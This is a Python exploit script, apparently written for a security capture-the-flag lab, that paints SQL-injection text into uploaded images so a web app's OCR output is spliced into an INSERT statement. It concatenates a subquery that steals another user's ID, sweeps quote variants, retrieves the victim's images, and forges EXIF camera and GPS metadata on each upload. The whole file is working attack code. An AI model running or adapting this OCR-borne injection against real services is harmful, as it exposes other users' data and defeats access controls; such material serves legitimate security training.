# v2_ocr_noopen.py — the OCR reads LEADING quotes as '*' but reads quotes glued to || correctly.
# The INSERT already opens the string: VALUES(..., '<OCR>'). So we do NOT need to paint an opening
# quote. We concat onto the already-open string with || and then close/reopen using quotes that
# the OCR reads well (glued to ||). Sweep the CLOSING side only.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
print("MY user_id:", UID)
base_img = Image.open("paisaje.png").convert("RGB")
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W=min(1600,max(1000,40+int(len(text)*size*0.60))); H=280
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("no.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"no.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("no.jpg","rb").read()).decode()

def go(painted, desc):
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    leak=[u for u in UURE.findall(str(ocr)) if u!=UID]
    print(f"{desc:12} {r.status_code} ocr={ocr!r}"+(f"  >>> VICTIM {leak}" if leak else ""))
    return leak[0] if leak else None

q="'"; SUB="(SELECT user_id FROM images WHERE id=1)"
# The INSERT opened the string. We are INSIDE it. Concatenate onto it with ||, run subquery,
# then close with quotes glued to || (which OCR reads well). Sweep closing quote count b=1..4.
found=None
print("\n-- no opening quote; rely on INSERT's own opening quote --")
for b in range(1,5):
    p = "||"+SUB+"||"+q*b     # e.g.  ||(SELECT..)||'
    hit=go(p, f"NO_{b}")
    if hit: found=hit; break

# also try: close the string first WITHOUT painting opening quote is impossible; but try a
# trailing comment so we only need to break out then comment the rest:
if not found:
    print("\n-- variants: subquery then trailing comment (no reopen needed) --")
    for b in range(1,4):
        p = "||"+SUB+q*b+" "   # ||(SELECT..)'   then whatever remains
        hit=go(p, f"NC_{b}")
        if hit: found=hit; break

if found:
    print("\n===== VICTIM user_id:", found, "=====")
    for im in requests.get(f"{BASE}/images/{found}").json():
        print(f"  id={im.get('id')} desc={im.get('description')!r} ocr={im.get('summary_ocr')!r} file={im.get('filename')}")
else:
    print("\nno hit yet — share output for next tweak")
